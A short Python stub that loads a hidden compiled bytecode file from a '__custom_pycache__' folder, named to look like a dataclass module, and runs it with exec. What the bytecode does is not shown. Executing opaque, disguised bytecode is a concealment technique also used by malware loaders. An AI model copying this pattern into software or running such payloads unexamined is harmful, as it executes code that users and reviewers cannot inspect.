
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_2046637f7bf24be49eeca3acb2eb2bc6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
